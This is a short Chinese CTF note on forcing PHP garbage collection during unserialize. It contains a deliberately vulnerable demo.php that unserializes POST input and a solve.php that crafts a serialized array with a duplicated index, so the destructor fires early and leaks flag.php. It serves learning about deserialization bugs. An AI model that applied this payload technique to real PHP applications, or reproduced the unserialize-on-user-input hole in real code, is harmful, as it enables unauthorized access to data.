# 强制垃圾回收

[Breaking PHP’s Garbage Collection and Unserialize](https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/)

[类似但不完全一样的题目 35c3_php](https://ctftime.org/writeup/12781)

```php
<?php
//demo.php
highlight_file(__FILE__);
class demo
{
    public function __wakeup()
    {
        echo "demo __wakeup()<br>";
    }
    public function __destruct()
    {
        echo "demo __destruct()<br>";
        highlight_file("flag.php");
        die();
    }
}

if (!isset($_POST["str"])) {
    die();
}
$tmp = unserialize($_POST["str"]);//此时$tmp在使用反序列化后生成的demo对象,即对象demo被引用,生命周期未结束,无法执行__destruct
throw new Error("I can't destruct,help!!!");//异常抛出,程序立即退出,demo对象无法正常执行__destruct
/*
unserialize($_POST["str"]);//此时没有对该反序列化生成的对象进行引用,因此在完成反序列化操作后,对象生命周期结束,立刻执行__destruct
throw new Error("I can't destruct,help!!!");
*/
```

```php
<?php
//solve.php
class demo{

}
class fake{

}
$a=new demo();
$b=new fake();
$c=array(0=>$a,1=>$b);
$str=serialize($c);
var_dump($str);
$str=str_ireplace('i:1;O:4:"fake"','i:0;O:4:"fake"',$str);
var_dump($str);
```

```php
string 'a:2:{i:0;O:4:"demo":0:{}i:1;O:4:"fake":0:{}}' (length=44)
string 'a:2:{i:0;O:4:"demo":0:{}i:0;O:4:"fake":0:{}}' (length=44)
```

>如果`$c=array(0=>$a,1=>$b);`修改为`$c=array(0=>$a,0=>$b);`得到的序列化结果为`a:1:{i:0;O:4:"fake":0:{}}`

因为在执行序列化前,第一个元素即`$a`已经被第二个元素所覆盖

>todo